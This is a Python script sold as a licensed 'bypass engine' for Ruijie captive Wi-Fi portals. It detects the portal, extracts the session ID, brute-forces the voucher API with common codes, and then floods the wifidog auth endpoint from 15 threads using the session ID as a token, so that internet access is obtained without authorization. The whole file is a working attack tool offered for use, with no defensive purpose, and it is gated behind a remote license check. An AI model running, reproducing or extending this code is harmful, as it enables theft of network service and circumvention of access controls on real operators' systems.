#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import json
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, date

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# ADVANCED CONFIGURATION
# ===============================
SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRuFebZZ-vGXmobRjDU9C1dWRgcSjXwQ5YjK24Goh9rE0TQtoDXYaKBGWPs94_INOTUuzlXAiXAx42P/pub?output=csv"
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")
LICENSE_INFO_FILE = os.path.expanduser("~/.ruijie_license_info.txt")

# Turbo Engine Settings
PING_THREADS = 15          # Increased for high-speed pulse
MIN_INTERVAL = 0.05        # Minimal delay for aggressive bypass
MAX_INTERVAL = 0.2
VOUCHER_LIST = ['123456', '888888', '111111', '000000', '999999', '12345678', '666666']

# Colors
RED, GREEN, CYAN, YELLOW, MAGENTA, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[93m", "\033[95m", "\033[0m"

stop_event = threading.Event()

# ===============================
# CORE LOGIC FUNCTIONS
# ===============================

def get_system_key():
    import uuid
    return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]

def check_approval():
    system_key = get_system_key()
    print(f"{CYAN}[*] System Key: {YELLOW}{system_key}{RESET}")
    try:
        r = requests.get(SHEET_CSV_URL, timeout=10)
        if system_key in r.text:
            print(f"{GREEN}[✓] Access Granted: License Valid{RESET}")
            return True
    except:
        if os.path.exists(LICENSE_INFO_FILE): return True
    print(f"{RED}[✗] Access Denied: Key Not Found{RESET}")
    return False

def check_internet():
    try: return requests.get("http://www.google.com", timeout=2).status_code == 200
    except: return False

def brute_force_voucher(portal_host, sid):
    session = requests.Session()
    print(f"{MAGENTA}[*] Initiating Brute Force Sequence...{RESET}")
    for code in VOUCHER_LIST:
        if stop_event.is_set(): break
        try:
            api = f"{portal_host}/api/auth/voucher/"
            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
            res = session.post(api, json=payload, timeout=3)
            if "success" in res.text.lower():
                print(f"{GREEN}[!] Exploit Success with Code: {code}{RESET}")
                return True
        except: continue
    return False

def turbo_pulse(auth_link, sid):
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            session.get(auth_link, headers=headers, timeout=2)
            print(f"{GREEN}[⚡] TURBO PULSE ACTIVE | SID: {sid[:6]}{RESET}", end="\r")
        except: pass
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_engine():
    print(f"{CYAN}--- Ruijie Ultimate Bypass Engine Loaded ---{RESET}")
    while not stop_event.is_set():
        if check_internet():
            print(f"{YELLOW}[•] Connection Stable. Monitoring...{RESET}", end="\r")
            time.sleep(10); continue

        try:
            # Capture Portal URL
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True)
            portal_url = r.url
            parsed = urlparse(portal_url)
            portal_host = f"{parsed.scheme}://{parsed.netloc}"
            
            # Extract Session ID
            sid = parse_qs(parsed.query).get('sessionId', [None])[0]
            if not sid:
                html = requests.get(portal_url).text
                match = re.search(r'sessionId=([a-zA-Z0-9]+)', html)
                sid = match.group(1) if match else None

            if sid:
                print(f"\n{GREEN}[✓] Target Locked: {sid}{RESET}")
                brute_force_voucher(portal_host, sid)
                
                params = parse_qs(parsed.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                print(f"{MAGENTA}[*] Deploying {PING_THREADS} Turbo Threads...{RESET}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=turbo_pulse, args=(auth_link, sid), daemon=True).start()
                
                while check_internet(): time.sleep(10)
        except: time.sleep(5)

if __name__ == "__main__":
    if check_approval():
        try: start_engine()
        except KeyboardInterrupt: stop_event.set(); print(f"\n{RED}Engine Halted.{RESET}")
